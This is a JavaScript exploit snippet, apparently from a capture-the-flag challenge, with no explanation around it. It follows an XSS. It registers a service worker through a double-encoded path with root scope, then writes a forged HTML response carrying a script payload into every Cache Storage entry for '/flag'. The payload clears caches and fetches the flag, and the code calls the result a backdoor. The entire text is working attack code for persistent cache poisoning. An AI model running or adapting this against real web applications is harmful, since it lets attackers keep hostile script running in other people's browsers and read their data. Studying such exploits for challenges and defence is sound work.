const poisonFlag = () => {
    var payload = `<script>
    console.log("XSS triggered on /flag!");
    // Clear all caches
    console.log("Clearing all the Service Worker caches data.");
    caches.keys().then((cacheNames) => {
        cacheNames.forEach((cacheName) => {
            caches.delete(cacheName);
        });
    });

    // Get the flag
    console.log("Fetching the flag.");
    setTimeout(() => {
        fetch("/flag").then(d => d.text()).then((d) => {
            console.log(d);
        })
    }, 1000)
    </script>`

    console.log("Poisoning /flag.");
    caches.keys().then(async (cacheKeys) => {
        for (const key of cacheKeys) {
            try {
                const cache = await caches.open(key);
                const req = new Request("/flag");
                const res = new Response(payload, {
                    headers: { "Content-Type": "text/html" }
                });
                await cache.put(req, res);
            } catch {}
        }
    });
    console.log("Backdoor ready! :)");
}

console.log("XSS Triggered on the challenge domain!");

// Load a global service worker
navigator.serviceWorker.register("/c%252Fsw.js", { scope: "/" }).then(poisonFlag);
